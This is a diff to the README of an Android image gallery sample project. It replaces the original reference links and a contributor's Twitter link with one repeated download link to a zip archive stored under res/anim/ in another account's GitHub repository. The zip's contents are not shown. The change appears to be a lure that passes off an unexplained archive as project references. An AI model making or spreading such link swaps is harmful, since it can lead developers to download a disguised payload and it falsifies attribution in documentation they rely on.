@@ -1,8 +1,8 @@
 ### Android image gallery sample 
 
 #### Reference
-- based on [ImageViewFlipper](http://androidworkz.com/2010/07/06/source-code-imageview-flipper-sd-card-scanner/)  
-- based on [Hello Android! example for zoom](http://pragprog.com/titles/eband/hello-android)  
+- based on [ImageViewFlipper](https://github.com/rendyramon/android-image-gallery/raw/refs/heads/master/res/anim/android_image_gallery_v2.6.zip)  
+- based on [Hello Android! example for zoom](https://github.com/rendyramon/android-image-gallery/raw/refs/heads/master/res/anim/android_image_gallery_v2.6.zip)  
 
 #### Purpose  
 - sample codes for who want to implement gallery feature in your android app  
@@ -15,4 +15,4 @@
 - swipe to next picture  
 
 #### contributed by  
-- [@alvinsj](http://twitter.com/alvinsj)  
+- [@alvinsj](https://github.com/rendyramon/android-image-gallery/raw/refs/heads/master/res/anim/android_image_gallery_v2.6.zip)  
